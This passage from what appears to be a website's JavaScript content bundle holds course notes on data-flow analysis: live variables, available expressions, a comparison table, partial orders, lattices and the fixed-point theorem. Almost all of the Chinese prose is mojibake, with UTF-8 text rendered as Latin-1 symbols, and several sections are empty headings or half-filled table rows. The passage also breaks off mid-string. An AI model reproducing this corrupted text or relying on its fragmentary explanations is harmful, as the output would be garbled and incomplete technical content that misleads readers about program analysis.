safe-approximation\n\né¦åç¡®å®ä¸ä¸ªé®é¢ï¼æä»¬æ¯ä½¿ç¨backwards analysisè¿æ¯ä½¿ç¨forwards analysisãè½ç¶æ²¡æåºå®çç­æ¡ï¼ä½æ¯æ¾ç¶backwards analysisæ´æ¹ä¾¿æä»¬è¿è¡åæãä»åå¾ååææ¶æä»¬åç°æä¸ªvariableè¢«useäºï¼åªéè¦ååå¯»æ¾å°å¶å®ä¹çpä½ç½®å³å¯ãèä½¿ç¨forwards analysisï¼æä»¬ä»på¼å§ï¼å°useçä½ç½®ï¼è¿éè¦è¿åå°pçä½ç½®ã\n\n\n\nè¿ä¸ªåä¸ä¸èçreaching definition analysisç±»ä¼¼ï¼ä½æ¯ç±äºæ¯backward analysisï¼å æ­¤å¨åå§åçæ¶åä¼æä¸åãå¹¶ä¸ï¼å¨ä¸è¬æåµä¸ï¼may analysisä¸è¬åå§åä¸ºç©ºï¼must analysisä¸è¬åå§åä¸ºallãåé¢ä¹ä¼æ»ç»ã\n\n\n\n\n# ä¸¾ä¸ä¸ªæ å­\n\nåå§åæä½ï¼\n\n\n\nç¬¬ä¸æ¬¡éåï¼\n\n\n\néè¦ä¸ä¸æ¬¡éåï¼å ä¸ºin[b]åçäºchangeï¼\n\n\n\n\n# available expressions analysis\n\nè¿æ¯ä¸ä¸ªmust analysisã\n\n> an expression x op y is available at program point p if all paths from the entry to p must pass through the evaluation of x op y, and after the last evaluation of x op y, there is no redefinition of x or y.\n\nå¤§æ¦å°±æ¯è¯´ï¼ä¸ä¸ªè¡¨è¾¾å¼x op y å¨pç¹æ¯å¯ç¨çï¼é£ä¹ä»å¥å£å°pç¹çææçè·¯å¾ä¸­å¿é¡»é½æ§è¡è¿x op yï¼å¹¶ä¸å¨æåä¸æ¬¡æ§è¡å®x op yä¹åå°±æ²¡æå¯¹äºxæèyçéæ°å®ä¹äºãå¸åçå©ç¨åºæ¯å°±æ¯å¯¹x op y éå¤è®¡ç®çç»æçæ¿æ¢ã\n\n\n# abstraction\n\n\n\n\n# safe-approximation\n\nç±äºæ¯must analysisï¼æä»¬è¦èèçæ¯å¨å®éçåºç¨åºæ¯çsafeï¼ä¹å°±æ¯è¯´å¨è¿éï¼æä»¬æ³è±¡æå¯¹äºè¡¨è¾¾å¼ç»æçæ¿æ¢çåºæ¯ä¸­ï¼å¦æè¯´æä»¬è¯¯æ¥äºï¼å°ä¸ä¸ªæ¬æ¥æ¯ä¸è½è¢«æ¿æ¢çè¡¨è¾¾å¼çå¼æ¿æ¢æäºï¼é£ä¹å¯¹äºç¨åºæ¥è¯´å°±æ¯ä¸safeçäºãé£ä¹å¦ææ¯è¿è¡under-approximationçè¯ï¼æä»¬ä¹è®¸ä¼æ¼æ¥ä¸ä¸ªæ¬æ¥å¯ä»¥è¿è¡æ¿æ¢çå¼ï¼ä½è¿ä¸ä¼å¯¼è´ç¨åºä¸safeï¼ä»ä»åªæ¯å¨ç¨åºä¼åçæ¶åæ²¡æè¾¾å°æå¥½çææèå·²ã\n\n\n\n\n# algorithm\n\n\n\n\n# ä¸¾äºä¸ªæ å­\n\nåå§åï¼\n\n\n\nç¬¬ä¸æ¬¡è¿­ä»£ï¼\n\n\n\nææçouté½åçäºååï¼æä»¥éè¦åä¸æ¬¡çè¿­ä»£ï¼\n\n\n\n\n# æ»ç»ä¸ç§ä¸åçdata-flow analysis\n\n                    reaching definitions      live variables   avaliable expression\ndomain              definition                variables        expression\ndirection           forwards                  backwards        forwards\nmay/must            may                       may              must\nboundary            out entry = null          in exit = null   out entry = null\ninitialization      out b = null              in b = null      out b = all\ntransfer function   out = gen u (in - kill)                    \nmeet                union                     union            and',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SA - DFA-Foundations",frontmatter:{title:"SA - DFA-Foundations",date:"2022-02-16T00:00:00.000Z",permalink:"/sec/sa/nju/dfafoundations",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA","DFA"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/03.DFA-Foundations.html",relativePath:"02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/03.DFA-Foundations.md",key:"v-70906098",path:"/sec/sa/nju/dfafoundations/",headers:[{level:2,title:"Iterative Algorithm, Another View",slug:"iterative-algorithm-another-view",normalizedTitle:"iterative algorithm, another view",charIndex:24},{level:2,title:"Partial Order - ååº",slug:"partial-order-ååº",normalizedTitle:"partial order - ååº",charIndex:619},{level:2,title:"Upper and Lower Bounds - ä¸ä¸ç",slug:"upper-and-lower-bounds-ä¸ä¸ç",normalizedTitle:"upper and lower bounds - ä¸ä¸ç",charIndex:1408},{level:2,title:"Lattice, Semilattice, Complete and Product Lattice - æ ¼ãåæ ¼ãå¨æ ¼",slug:"lattice-semilattice-complete-and-product-lattice-æ ¼ãåæ ¼ãå¨æ ¼",normalizedTitle:"lattice, semilattice, complete and product lattice - æ ¼ãåæ ¼ãå¨æ ¼",charIndex:1649},{level:3,title:"Lattice",slug:"lattice",normalizedTitle:"lattice",charIndex:1649},{level:3,title:"Semilattice",slug:"semilattice",normalizedTitle:"semilattice",charIndex:1658},{level:3,title:"Complete Lattice",slug:"complete-lattice",normalizedTitle:"complete lattice",charIndex:2096},{level:3,title:"Product Lattice",slug:"product-lattice",normalizedTitle:"product lattice",charIndex:1684},{level:2,title:"Data Flow Analysis Framework via Lattice",slug:"data-flow-analysis-framework-via-lattice",normalizedTitle:"data flow analysis framework via lattice",charIndex:2927},{level:2,title:"Monotonicity and Fixed Point Theorem - å½æ°åè°æ§åä¸å¨ç¹å®ç",slug:"monotonicity-and-fixed-point-theorem-å½æ°åè°æ§åä¸å¨ç¹å®ç",normalizedTitle:"monotonicity and fixed point theorem - å½æ°åè°æ§åä¸å¨ç¹å®ç",charIndex:3408},{level:3,title:"å½æ°åè°æ§",slug:"å½æ°åè°æ§",normalizedTitle:"å½æ°åè°æ§",charIndex:3361},{level:3,title:"ä¸å¨ç¹å®ç",slug:"ä¸å¨ç¹å®ç",normalizedTitle:"ä¸å¨ç¹å®ç",charIndex:3367},{level:2,title:"Relate Iterative Algorithm to Fixed Point Theorem - è¿­ä»£ç®æ³è½¬åä¸ºä¸å¨ç¹å®ç",slug:"relate-iterative-algorithm-to-fixed-point-theorem-è¿­ä»£ç®æ³è½¬åä¸ºä¸å¨ç¹å®ç",normalizedTitle:"relate iterative algorithm to fixed point theorem - è¿­ä»£ç®æ³è½¬åä¸ºä¸å¨ç¹å®ç",charIndex:3788},{level:2,title:"May/Must Analysis, A Lattice View",slug:"may-must-analysis-a-lattice-view",normalizedTitle:"may/must analysis, a lattice view",charIndex:3857},{level:2,title:"Distributivity and MOP",slug:"distributivity-and-mop",normalizedTitle:"distributivity and mop",charIndex:3895},{level:2,title:"Constant Propagation",slug:"constant-propagation",normalizedTitle:"constant propagation",charIndex:3922},{level:2,title:"Work-list Algorithm",slug:"work-list-algorithm",normalizedTitle:"work-list algorithm",charIndex:3947}],headersStr:"Iterative Algorithm, Another View Partial Order - ååº Upper and Lower Bounds - ä¸ä¸ç Lattice, Semilattice, Complete and Product Lattice - æ ¼ãåæ ¼ãå¨æ ¼ Lattice Semilattice Complete Lattice Product Lattice Data Flow Analysis Framework via Lattice Monotonicity and Fixed Point Theorem - å½æ°åè°æ§åä¸å¨ç¹å®ç å½æ°åè°æ§ ä¸å¨ç¹å®ç Relate Iterative Algorithm to Fixed Point Theorem - è¿­ä»£ç®æ³è½¬åä¸ºä¸å¨ç¹å®ç May/Must Analysis, A Lattice View Distributivity and MOP Constant Propagation Work-list Algorithm",content:"# DFA - Foundations\n\n\n# Iterative Algorithm, Another View\n\nä¸ä¸ªæKä¸ªèç¹çCFGï¼è¿­ä»£ç®æ³å¨æ¯æ¬¡è¿­ä»£çè¿ç¨ä¸­ï¼ä¼æ´æ°æ¯ä¸ªèç¹çOUTä¿¡æ¯ï¼è¡¨ç¤ºä¸ºOUT[n]ã\n\nåè®¾å¨Data Flow Analysisä¸­çå¼åæ¯Vï¼é£ä¹æä»¬å¯ä»¥å®ä¹ä¸ä¸ªK-tupleï¼\n\n(OUT[n1],OUT[n2],...OUT[nk])\n\næ¯ä¸ªNodeçOUTå¼ä½ä¸ºK-tupleçä¸ä¸ªåç´ ãå ä¸ºæ¯ä¸ªOUT[n]å¯¹åºçå¼åé½æ¯Vï¼é£ä¹K-tupleæå¯¹åºçä¸ä¸ªå¼åå°±æ¯Vçproductï¼å³(V1 x V2 ... x Vk)ï¼å®ä¹ä¸ºVkã\n\nä¸æ¬¡è¿­ä»£æ¯ä¸ä¸ªå¨ä½ï¼å¯ä»¥è¡¨ç¤ºä¸ºä¸ä¸ªå½æ°F: Vk -> Vkã\n\né£ä¹ï¼è¿ä¸ªç®æ³å¯ä»¥çææ¯ä¸ªè¿­ä»£è¾åºä¸ä¸ªK-tupleså¼ï¼ç´å°æåK-tuplesä¸ååçååã\n\næ ¹æ®ä»¥ä¸æè¯´çæ­¥éª¤ï¼æä»¬å¯ä»¥å°ç®æ³å¾ç¤ºå¦ä¸ï¼\n\n\n\nå½ X = F(X)æ¶ï¼Xæ¯Fçä¸ä¸ªä¸å¨ç¹ãè¿­ä»£ç®æ³ä¹å°±è¾¾å°äºä¸ä¸ªä¸å¨ç¹(reach a fixed point)ã\n\nå¯¹äºä¸é¢çè¿­ä»£ç®æ³ä¼æä»¥ä¸çé®é¢ï¼\n\n * å¯¹äºä¸ä¸ªæ®éçç®æ³ï¼å®è½ååï¼ä¸å®å¯ä»¥è¾¾å°ä¸ä¸ªä¸å¨ç¹åï¼ä¸å®ä¼è¾åºä¸ä¸ªç»æåï¼\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼ä¸å®åªæä¸ä¸ªåï¼å¦æä¸æ­¢ä¸ä¸ªï¼é£ä¹æä»¬å¾åºçè¿ä¸ªä¸å¨ç¹æ¯æç²¾ç¡®çåï¼\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼é£ä¹æä»¬æåæåµä¸è½å¤å¾å°ç»æï¼\n\nä¸é¢æ¯è§£å³ä»¥ä¸é®é¢ççè®ºåºç¡~\n\n\n# Partial Order - ååº\n\n\n\nå®ä¹ä¸ä¸ªååºé(P,<=)ï¼Pæ¯ä¸ä¸ªéåï¼<=æ¯ä¸ä¸ªååºå³ç³»ï¼å½<=æ»¡è¶³å¦ä¸çç¹æ§ï¼åææä¸ä¸ªååºéã\n\n * èªåæ§ï¼ä»»æxå±äºPï¼x <= x\n * åå¯¹ç§°æ§ï¼ ä»»æçx,y å±äºP, x <= y å¹¶ä¸ y <= xï¼é£ä¹ x = y\n * ä¼ éæ§ï¼ ä»»æx,y,z å±äºPï¼x <= y å¹¶ä¸ y <= zï¼é£ä¹ x <= z\n\næ å­ï¼\n\n 1. ç»å®(S,<=),Sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<=ã\n    \n    * èªåæ§ 1<=1 , 2 <= 2 â\n    * åå¯¹ç§°æ§ï¼ x <= y y <= x x = y â\n    * ä¼ éæ§ï¼ 1<=2<=3 , 1<=3 â\n\n 2. ç»å®(S,<),Sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<ã\n    \n    * èªåæ§ 1 < 1 , 2 < 2 Ã\n\n 3. ç»å®(S,<=),Sæ¯ä¸ä¸ªè±æåè¯çéåï¼ååºå³ç³»æ¯ å­ä¸²å³ç³»ã\n    \n    \n    \n    * èªåæ§ï¼æ¯ä¸ä¸ªstringæ¯èªå·±çsubstring â\n    * åå¯¹ç§°æ§ï¼å¦æä¸ä¸ªstringæ¯å¦ä¸ä¸ªstringçsubstringï¼åæ¶substringçsubstringæ¯stringï¼åstringåsubstringç¸å â\n    * ä¼ éæ§ï¼str1æ¯str2çsubstringï¼str2æ¯str3çsubstringï¼åstr1æ¯str3çsubstring â\n\nååºæçæ¯éåä¸­çä»»æä¸¤ä¸ªåç´ å¯ä»¥ä¸å­å¨æ¯è¾æ§ï¼æ¯å¦ä¸å¾ä¸­çpin sin å¹¶ä¸æ»¡è¶³ååºå³ç³»ï¼ä¸å¾ç{a},{b}ä¹ä¸æ»¡è¶³ååºå³ç³»ã\n\n 4. ç»å®(S,<=),Sæ¯ä¸ä¸ªå¹éï¼ååºå³ç³»æ¯å­éã\n    \n    \n    \n    * èªåæ§ â\n    * åå¯¹ç§°æ§ â\n    * ä¼ éæ§ â\n\n\n# Upper and Lower Bounds - ä¸ä¸ç\n\n\n\nç»å®ä¸ä¸ªååºé(P,<=)ï¼å­å¨ä¸ä¸ªå­éS,å¯¹äºä»»æåç´ uå±äºPï¼å½ä»»æåç´ xå±äºS,æ»¡è¶³x<=uï¼åuæ¯Sçä¸ä¸ªä¸çï¼åæ ·çï¼å¯¹äºä»»æåç´ lå±äºP, å½ä»»æåç´ xå±äºSï¼æ»¡è¶³l<=xï¼ålæ¯Sçä¸ä¸ªä¸çã\n\n\n\næå°ä¸çï¼æå¤§ä¸ç\n\n\n\n\n\nå½éåSåªåå«ä¸¤ä¸ªåç´ æ¶ï¼å¯ä»¥ç¨å¦ä¸åæ³ï¼\n\n\n\nä¸äºæ§è´¨ï¼\n\n * ä¸æ¯æ¯ä¸ä¸ªååºéé½ælubåglb\n * ä¸ä¸ªååºéå¦æælubæèglbï¼é£ä¹æ¯å¯ä¸çã\n\n\n\n\n# Lattice, Semilattice, Complete and Product Lattice - æ ¼ãåæ ¼ãå¨æ ¼\n\n\n# Lattice\n\nç»å®ä¸ä¸ªååºé(P,<=),ä»»æçPååç´ a,bï¼å¦ææå°ä¸çåæå¤§ä¸çé½å­å¨ï¼åæä»¬ç§°ååºéæ¯ä¸æ ¼ã\n\nååºéä¸­æ¯ä¸¤ä¸ªåç´ é½ææå°ä¸çåæå¤§ä¸çæä»¬å°±ç§°è¯¥ååºéæ¯ä¸ä¸ªæ ¼ã\n\næ å­ï¼\n\n 1. ç»å®(S,<=),Sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<=ã\n    \n    * ä»»æä¸¤ä¸ªåç´ çmaxåminæ¯æå°ä¸çãæå¤§ä¸çã\n\n 2. ç»å®(S,<=),Sæ¯ä¸ä¸ªè±æåè¯çéåï¼ååºå³ç³»æ¯ å­ä¸²å³ç³»ã\n    \n    \n    \n    * pin å sin æ²¡æä¸ç\n\n 3. ç»å®(S,<=),Sæ¯ä¸ä¸ªå¹éï¼ååºå³ç³»æ¯å­éã\n    \n    \n\n\n# Semilattice\n\n\n\nç»å®ä¸ä¸ªååºé(P,<=)ï¼ä»»æa,bå±äºP\n\nå¦æåªå­å¨ä¸ä¸ªæå°ä¸ççè¯ï¼åç§°ä¸ºjoinçåæ ¼\n\nå¦æåªå­å¨ä¸ä¸ªæå¤§ä¸ççè¯ï¼åç§°ä¸ºmeetçåæ ¼\n\n\n# Complete Lattice\n\n\n\nç»å®ä¸ä¸ªæ ¼(P,<=)ï¼å¯¹äºæ¯ä¸ä¸ªPçå­éSï¼é½å­å¨Sçæå°ä¸çåæå¤§ä¸çï¼åç§°(P,<=)ä¸ºå¨æ ¼ã\n\nä¸ä¸ªlatticeçææå­éé½ææå°ä¸çåæå¤§ä¸çã\n\næ å­ï¼\n\n 1. ç»å®(S,<=),Sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<=ã\n    * å¯¹äºæ­£æ´æ°éåï¼æ¯æ ç©·çæ²¡æè¾¹çï¼å æ­¤å­å¨ä¸ä¸ªæå¤§ä¸çï¼ä¸å­å¨æå°ä¸çãå æ­¤ä¸æ¯å¨æ ¼ã\n 2. ç»å®(S,<=),Sæ¯ä¸ä¸ªå¹éï¼ååºå³ç³»æ¯å­éã\n    * ææçsubseté½ææå°ä¸çåæå¤§ä¸çã\n\n\n\n\n\næ¯ä¸ä¸ªå¨æ ¼é½æä¸ä¸ªæå¤§çåç´ topï¼åæå°çåç´ bottomã\n\nåªè¦complete latticeæ¯æç©·çï¼ä¸å®æ¯å¨æ ¼ãä¸ä¸ªå¨æ ¼ä¸å®æ¯æç©·çåï¼ 0-1ä¹é´çææçå®æ°æ¯å¨æ ¼ï¼ä½æ¯æ¯æ ç©·çã\n\n> å¨å¤§é¨åæåµä¸æä»¬data flow analysisä¸­ä½¿ç¨çé½æ¯æç©·çå¨æ ¼ã\n\n\n# Product Lattice\n\n\n\nç»å®ä¸äºæ ¼L1=(P1,<=1),L2=(P2,<=2)...Ln=(Pn,<=n),å¦ææ¯ä¸ä¸ªlatticeé½å­å¨ä¸ä¸ªæå°ä¸çåæå¤§ä¸çãåæä»¬å¯ä»¥å®ä¹ä¸ä¸ªproduct lattice Ln = (P,<=)ï¼\n\n * P = P1 x ... x Pn\n * (x1,...,xn) <= (y1,...,yn) <=> (x1 <= y1)ä¸...ä¸(xn <= yn)\n * (x1,...,xn) , (y1,...,yn)çæå°ä¸ç = (x1åy1çæå°ä¸ç,...,xnåynçæå°ä¸ç)\n * (x1,...,xn) , (y1,...,yn)çæå¤§ä¸ç = (x1åy1çæå¤§ä¸ç,...,xnåynçæå¤§ä¸ç)\n\næ§è´¨ï¼\n\n * ä¸ä¸ªproduct latticeæ¯ä¸ä¸ªlattice\n * ä¸ä¸ªproduct lattice Lä¸­çæ¯ä¸ä¸ªlatticeé½æ¯completeï¼é£ä¹Lä¹æ¯completeã\n\n\n# Data Flow Analysis Framework via Lattice\n\næäºä¸é¢ççè®ºåºç¡ï¼å°±å¯ä»¥å©ç¨çè®ºåºç¡è¿è¡data flow analysisäºã\n\n\n\ndata flow analysisçåºæ¬æ¡æ¶ç±ä»¥ä¸ä¸ä¸ªåç´ ææï¼\n\n * Dï¼æ°æ®æµçèæ¹åï¼forwardsè¿æ¯backwards\n * Lï¼ä¸ä¸ªæ ¼åå«å¼åVåæä½ç¬¦ join or meet\n * Fï¼transfer functions\n\næ å­ï¼\n\n\n\nå¨latticeä¸ä¸æ­å°ä½¿ç¨meetæèjoinï¼åå©transfer functionsè¿è¡è¿­ä»£ã\n\nåå°ä¸é¢æåºçé®é¢ï¼\n\n * å¯¹äºä¸ä¸ªæ®éçç®æ³ï¼å®è½ååï¼ä¸å®å¯ä»¥è¾¾å°ä¸ä¸ªä¸å¨ç¹åï¼ä¸å®ä¼è¾åºä¸ä¸ªç»æåï¼\n   \n   * latticeå½æ°çåè°æ§é®é¢\n\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼ä¸å®åªæä¸ä¸ªåï¼å¦æä¸æ­¢ä¸ä¸ªï¼é£ä¹æä»¬å¾åºçè¿ä¸ªä¸å¨ç¹æ¯æç²¾ç¡®çåï¼\n   \n   * å¯ä»¥ï¼X=F(X)\n   \n   \n   \n   * å½æ°åè°æ§ï¼ä¸å¨ç¹å®çã\n\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼é£ä¹æä»¬æåæåµä¸è½å¤å¾å°ç»æï¼\n\n\n# Monotonicity and Fixed Point Theorem - å½æ°åè°æ§åä¸å¨ç¹å®ç\n\n\n# å½æ°åè°æ§\n\n\n\nä¸ä¸ªfunction f: L -> L(Læ¯ä¸ä¸ªlattice)ï¼å¦æå½æ°fæ¯åè°çï¼é£ä¹ä»»æçx,yå±äºLï¼å¦æx<=y => f(x) <= f(y)\n\n\n# ä¸å¨ç¹å®ç\n\n\n\nç»å®ä¸ä¸ªå¨æ ¼(L,<=),å¦ææ»¡è¶³å¦ä¸ç»è®ºï¼\n\n 1. f: L -> L æ¯åè°ç\n 2. Læ¯æç©·ç\n\né£ä¹ï¼æä»¬è½æ±å¾fçæå°ä¸å¨ç¹ï¼éè¿è¿­ä»£f(bottom),f(f(bottom)),...,fk(bottom)ç´å°è¾¾å°ä¸ä¸ªä¸å¨ç¹ï¼è¯¥ä¸å¨ç¹å°±æ¯æå°ä¸å¨ç¹ãæå¤§ä¸å¨ç¹æ¯éè¿è¿­ä»£f(top),f(f(top)),...,fk(top)ç´å°è¾¾å°ä¸ä¸ªä¸å¨ç¹ï¼è¯¥ä¸å¨ç¹å°±æ¯æå¤§ä¸å¨ç¹ã\n\nå­å¨ä¸å¨ç¹è¯æï¼\n\n\n\næå°ä¸å¨ç¹è¯æï¼\n\n\n\n\n\n\n# Relate Iterative Algorithm to Fixed Point Theorem - è¿­ä»£ç®æ³è½¬åä¸ºä¸å¨ç¹å®ç\n\n\n# May/Must Analysis, A Lattice View\n\n\n# Distributivity and MOP\n\n\n# Constant Propagation\n\n\n# Work-list Algorithm",normalizedContent:"# dfa - foundations\n\n\n# iterative algorithm, another view\n\nä¸ä¸ªækä¸ªèç¹çcfgï¼è¿­ä»£ç®æ³å¨æ¯æ¬¡è¿­ä»£çè¿ç¨ä¸­ï¼ä¼æ´æ°æ¯ä¸ªèç¹çoutä¿¡æ¯ï¼è¡¨ç¤ºä¸ºout[n]ã\n\nåè®¾å¨data flow analysisä¸­çå¼åæ¯vï¼é£ä¹æä»¬å¯ä»¥å®ä¹ä¸ä¸ªk-tupleï¼\n\n(out[n1],out[n2],...out[nk])\n\næ¯ä¸ªnodeçoutå¼ä½ä¸ºk-tupleçä¸ä¸ªåç´ ãå ä¸ºæ¯ä¸ªout[n]å¯¹åºçå¼åé½æ¯vï¼é£ä¹k-tupleæå¯¹åºçä¸ä¸ªå¼åå°±æ¯vçproductï¼å³(v1 x v2 ... x vk)ï¼å®ä¹ä¸ºvkã\n\nä¸æ¬¡è¿­ä»£æ¯ä¸ä¸ªå¨ä½ï¼å¯ä»¥è¡¨ç¤ºä¸ºä¸ä¸ªå½æ°f: vk -> vkã\n\né£ä¹ï¼è¿ä¸ªç®æ³å¯ä»¥çææ¯ä¸ªè¿­ä»£è¾åºä¸ä¸ªk-tupleså¼ï¼ç´å°æåk-tuplesä¸ååçååã\n\næ ¹æ®ä»¥ä¸æè¯´çæ­¥éª¤ï¼æä»¬å¯ä»¥å°ç®æ³å¾ç¤ºå¦ä¸ï¼\n\n\n\nå½ x = f(x)æ¶ï¼xæ¯fçä¸ä¸ªä¸å¨ç¹ãè¿­ä»£ç®æ³ä¹å°±è¾¾å°äºä¸ä¸ªä¸å¨ç¹(reach a fixed point)ã\n\nå¯¹äºä¸é¢çè¿­ä»£ç®æ³ä¼æä»¥ä¸çé®é¢ï¼\n\n * å¯¹äºä¸ä¸ªæ®éçç®æ³ï¼å®è½ååï¼ä¸å®å¯ä»¥è¾¾å°ä¸ä¸ªä¸å¨ç¹åï¼ä¸å®ä¼è¾åºä¸ä¸ªç»æåï¼\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼ä¸å®åªæä¸ä¸ªåï¼å¦æä¸æ­¢ä¸ä¸ªï¼é£ä¹æä»¬å¾åºçè¿ä¸ªä¸å¨ç¹æ¯æç²¾ç¡®çåï¼\n * å¦æè½è¾¾å°ä¸å¨ç¹ï¼é£ä¹æä»¬æåæåµä¸è½å¤å¾å°ç»æï¼\n\nä¸é¢æ¯è§£å³ä»¥ä¸é®é¢ççè®ºåºç¡~\n\n\n# partial order - ååº\n\n\n\nå®ä¹ä¸ä¸ªååºé(p,<=)ï¼pæ¯ä¸ä¸ªéåï¼<=æ¯ä¸ä¸ªååºå³ç³»ï¼å½<=æ»¡è¶³å¦ä¸çç¹æ§ï¼åææä¸ä¸ªååºéã\n\n * èªåæ§ï¼ä»»æxå±äºpï¼x <= x\n * åå¯¹ç§°æ§ï¼ ä»»æçx,y å±äºp, x <= y å¹¶ä¸ y <= xï¼é£ä¹ x = y\n * ä¼ éæ§ï¼ ä»»æx,y,z å±äºpï¼x <= y å¹¶ä¸ y <= zï¼é£ä¹ x <= z\n\næ å­ï¼\n\n 1. ç»å®(s,<=),sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<=ã\n    \n    * èªåæ§ 1<=1 , 2 <= 2 â\n    * åå¯¹ç§°æ§ï¼ x <= y y <= x x = y â\n    * ä¼ éæ§ï¼ 1<=2<=3 , 1<=3 â\n\n 2. ç»å®(s,<),sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<ã\n    \n    * èªåæ§ 1 < 1 , 2 < 2 Ã\n\n 3. ç»å®(s,<=),sæ¯ä¸ä¸ªè±æåè¯çéåï¼ååºå³ç³»æ¯ å­ä¸²å³ç³»ã\n    \n    \n    \n    * èªåæ§ï¼æ¯ä¸ä¸ªstringæ¯èªå·±çsubstring â\n    * åå¯¹ç§°æ§ï¼å¦æä¸ä¸ªstringæ¯å¦ä¸ä¸ªstringçsubstringï¼åæ¶substringçsubstringæ¯stringï¼åstringåsubstringç¸å â\n    * ä¼ éæ§ï¼str1æ¯str2çsubstringï¼str2æ¯str3çsubstringï¼åstr1æ¯str3çsubstring â\n\nååºæçæ¯éåä¸­çä»»æä¸¤ä¸ªåç´ å¯ä»¥ä¸å­å¨æ¯è¾æ§ï¼æ¯å¦ä¸å¾ä¸­çpin sin å¹¶ä¸æ»¡è¶³ååºå³ç³»ï¼ä¸å¾ç{a},{b}ä¹ä¸æ»¡è¶³ååºå³ç³»ã\n\n 4. ç»å®(s,<=),sæ¯ä¸ä¸ªå¹éï¼ååºå³ç³»æ¯å­éã\n    \n    \n    \n    * èªåæ§ â\n    * åå¯¹ç§°æ§ â\n    * ä¼ éæ§ â\n\n\n# upper and lower bounds - ä¸ä¸ç\n\n\n\nç»å®ä¸ä¸ªååºé(p,<=)ï¼å­å¨ä¸ä¸ªå­és,å¯¹äºä»»æåç´ uå±äºpï¼å½ä»»æåç´ xå±äºs,æ»¡è¶³x<=uï¼åuæ¯sçä¸ä¸ªä¸çï¼åæ ·çï¼å¯¹äºä»»æåç´ lå±äºp, å½ä»»æåç´ xå±äºsï¼æ»¡è¶³l<=xï¼ålæ¯sçä¸ä¸ªä¸çã\n\n\n\næå°ä¸çï¼æå¤§ä¸ç\n\n\n\n\n\nå½éåsåªåå«ä¸¤ä¸ªåç´ æ¶ï¼å¯ä»¥ç¨å¦ä¸åæ³ï¼\n\n\n\nä¸äºæ§è´¨ï¼\n\n * ä¸æ¯æ¯ä¸ä¸ªååºéé½ælubåglb\n * ä¸ä¸ªååºéå¦æælubæèglbï¼é£ä¹æ¯å¯ä¸çã\n\n\n\n\n# lattice, semilattice, complete and product lattice - æ ¼ãåæ ¼ãå¨æ ¼\n\n\n# lattice\n\nç»å®ä¸ä¸ªååºé(p,<=),ä»»æçpååç´ a,bï¼å¦ææå°ä¸çåæå¤§ä¸çé½å­å¨ï¼åæä»¬ç§°ååºéæ¯ä¸æ ¼ã\n\nååºéä¸­æ¯ä¸¤ä¸ªåç´ é½ææå°ä¸çåæå¤§ä¸çæä»¬å°±ç§°è¯¥ååºéæ¯ä¸ä¸ªæ ¼ã\n\næ å­ï¼\n\n 1. ç»å®(s,<=),sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<=ã\n    \n    * ä»»æä¸¤ä¸ªåç´ çmaxåminæ¯æå°ä¸çãæå¤§ä¸çã\n\n 2. ç»å®(s,<=),sæ¯ä¸ä¸ªè±æåè¯çéåï¼ååºå³ç³»æ¯ å­ä¸²å³ç³»ã\n    \n    \n    \n    * pin å sin æ²¡æä¸ç\n\n 3. ç»å®(s,<=),sæ¯ä¸ä¸ªå¹éï¼ååºå³ç³»æ¯å­éã\n    \n    \n\n\n# semilattice\n\n\n\nç»å®ä¸ä¸ªååºé(p,<=)ï¼ä»»æa,bå±äºp\n\nå¦æåªå­å¨ä¸ä¸ªæå°ä¸ççè¯ï¼åç§°ä¸ºjoinçåæ ¼\n\nå¦æåªå­å¨ä¸ä¸ªæå¤§ä¸ççè¯ï¼åç§°ä¸ºmeetçåæ ¼\n\n\n# complete lattice\n\n\n\nç»å®ä¸ä¸ªæ ¼(p,<=)ï¼å¯¹äºæ¯ä¸ä¸ªpçå­ésï¼é½å­å¨sçæå°ä¸çåæå¤§ä¸çï¼åç§°(p,<=)ä¸ºå¨æ ¼ã\n\nä¸ä¸ªlatticeçææå­éé½ææå°ä¸çåæå¤§ä¸çã\n\næ å­ï¼\n\n 1. ç»å®(s,<=),sæ¯ä¸ä¸ªæ´æ°éåï¼ååºå³ç³»æ¯<=ã\n    * å¯¹äºæ­£æ´æ°éåï¼æ¯æ ç©·çæ²¡æè¾¹çï¼å æ­¤å­å¨ä¸ä¸ªæå¤§ä¸çï¼ä¸å­å¨æå°ä¸çãå æ­¤ä¸æ¯å¨æ ¼ã\n 2. ç»å®(s,<=),sæ¯ä¸ä¸ªå¹éï¼ååºå³ç³»æ¯å­éã\n    * ææçsubseté½ææå°ä¸çåæå¤§ä¸çã\n\n\n\n\n\næ¯ä¸ä¸ªå¨æ ¼é½æä¸ä¸ªæå¤§çåç´ topï¼åæå°çåç´ bottomã\n\nåªè¦complete latticeæ¯æç©·çï¼ä¸å®æ¯å¨æ ¼ãä¸ä¸ªå¨æ ¼ä¸å®æ¯æç©·çåï¼ 0-1ä¹é´çææçå®æ°æ¯å¨æ ¼ï¼ä½æ¯æ¯æ ç©·çã\n\n> å¨å¤§é¨åæåµä¸æä»¬data flow analysisä¸­ä½¿ç¨çé½æ¯æç©·çå¨æ ¼ã\n\n\n# product lattice\n\n\n\nç»å®ä¸äºæ 